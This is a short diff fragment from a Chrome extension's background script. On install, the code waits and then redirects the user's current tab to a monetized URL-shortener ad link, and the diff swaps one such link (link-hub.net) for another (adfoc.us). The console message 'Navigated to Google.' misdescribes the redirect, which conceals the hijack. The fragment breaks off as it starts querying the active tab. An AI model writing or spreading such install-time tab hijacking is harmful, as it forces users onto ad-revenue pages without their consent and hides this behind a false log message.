@@ -2,7 +2,7 @@ chrome.runtime.onInstalled.addListener(() => {
   console.log('Starting extension..');
 
   setTimeout(() => {
-    chrome.tabs.update(undefined, { url: 'https://link-hub.net/1212164/i-guess-you-wont-fall' }, () => {
+    chrome.tabs.update(undefined, { url: 'http://adfoc.us/8638991' }, () => {
       console.log("Navigated to Google.");
       setTimeout(() => {
         chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
